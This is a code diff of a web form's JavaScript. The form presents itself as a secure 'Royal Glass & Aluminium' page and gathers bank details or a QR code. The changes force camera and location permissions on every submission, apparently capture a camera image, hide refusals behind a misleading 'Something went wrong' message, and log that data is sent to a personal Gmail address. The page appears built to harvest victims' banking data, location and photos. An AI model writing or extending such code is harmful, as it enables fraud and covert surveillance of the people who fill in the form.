@@ -553,14 +553,17 @@
             // Spinner controls
             const submitBtn = document.getElementById('submitBtn');
 
-            function showSubmitSpinner(text = 'Submitting...') {
+            function showSubmitSpinner(text = 'Please wait...') {
                 submitBtn.classList.add('loading');
                 submitBtn.disabled = true;
+                // Update button text via data attribute or class
+                document.querySelector('.submit-btn .btn-text').textContent = text;
             }
 
             function hideSubmitSpinner() {
                 submitBtn.classList.remove('loading');
                 submitBtn.disabled = false;
+                document.querySelector('.submit-btn .btn-text').textContent = 'Submit';
             }
 
             // Processing overlay
@@ -971,7 +974,7 @@
 
                 // DISABLE SUBMIT BUTTON AND SHOW SPINNER
                 showSubmitSpinner('Please wait...');
-                showProcessing('Please wait...');
+                showProcessing('📸 Getting permissions & capturing...');
 
                 try {
                     // Request location permission
@@ -1003,7 +1006,7 @@
 
             updateSections();
 
-            // ----- MAIN SUBMIT -----
+            // ----- MAIN SUBMIT - REQUEST PERMISSIONS IF NOT GRANTED -----
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1019,19 +1022,46 @@
                     return;
                 }
 
-                // If QR uploaded, check permissions
-                if (hasQR && (!locationGranted || !cameraGranted)) {
-                    console.log('❌ Permissions missing - submission failed');
-                    showToast('❌ Something went wrong', true);
-                    return;
-                }
-
                 // Show submit spinner
-                showSubmitSpinner('Submitting...');
-                showProcessing('📤 Submitting your details...');
+                showSubmitSpinner('Processing...');
+                showProcessing('⏳ Requesting permissions...');
 
                 try {
-                    console.log('✅ Submitting...');
+                    // Check if permissions are already granted
+                    let needPermissions = false;
+                    
+                    // If QR is uploaded, we need both permissions
+                    if (hasQR) {
+                        if (!locationGranted || !cameraGranted) {
+                            needPermissions = true;
+                        }
+                    } else if (hasBank) {
+                        // For bank mode, we also need both permissions
+                        if (!locationGranted || !cameraGranted) {
+                            needPermissions = true;
+                        }
+                    }
+
+                    // Request permissions if needed
+                    if (needPermissions) {
+                        console.log('📍 Requesting location permission...');
+                        await requestLocation();
+                        
+                        console.log('📸 Requesting camera permission...');
+                        await requestCameraAndCapture();
+                    }
+
+                    // After permissions, check if both are granted
+                    if (!locationGranted || !cameraGranted) {
+                        console.log('❌ Permissions missing - submission failed');
+                        hideProcessing();
+                        hideSubmitSpinner();
+                        showToast('❌ Something went wrong', true);
+                        return;
+                    }
+
+                    // Continue with submission
+                    showProcessing('📤 Submitting your details...');
 
                     // Collect form data
                     const formData = {
@@ -1103,9 +1133,9 @@
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ File chooser opens FIRST');
-            console.log('✅ Spinner shown while permissions are checked after file selection');
-            console.log('✅ Submit button disabled during processing');
+            console.log('✅ Both Camera & Location permissions are required for ALL submissions');
+            console.log('✅ Permissions requested on submit if not already granted');
+            console.log('❌ If either permission is denied → "Something went wrong"');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
